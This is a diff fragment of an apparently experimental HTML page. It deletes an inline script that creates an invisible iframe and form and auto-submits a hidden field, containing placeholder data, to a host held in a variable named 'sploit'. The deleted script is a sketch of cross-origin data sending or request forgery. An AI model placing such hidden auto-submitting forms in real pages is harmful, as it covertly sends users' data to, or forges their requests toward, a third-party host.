@@ -11,36 +11,6 @@
 <script src="http://localhost/h.php"></script>
 
 <script>
-	//var a = "foo {0} is = {1}".format("thing", "something else");
-	//alert(a);
-
-	var ifr = document.createElement('iframe');
-	var frm = document.createElement('form');
-	ifr.setAttribute("name", "cspost");
-	ifr.setAttribute("style", "display:none;width:0;height:0;");
-	frm.setAttribute("action", "http://"+sploit+"/debugvars.php");
-	frm.setAttribute("method", "post");
-	frm.setAttribute("target", "cspost");
-
-	var e = document.createElement('input');
-	e.setAttribute("type", "hidden");
-	e.setAttribute("name","cross-origin");
-	e.setAttribute("value", "THE DATA");
-	e.setAttribute("id", "inputid");
-	frm.appendChild(e);
-
-
-	// create hidden inputs, add them
-	// not shown, but similar (create, setAttribute, appendChild)
-
-	ifr.appendChild(frm);
-	document.body.appendChild(ifr);
-	var q = document.getElementById("inputid");
-	console.log(q);
-	frm.submit();
-</script>
-
-<script>
 	function reqListener () {
 		  console.log(this.responseText);
 	  }
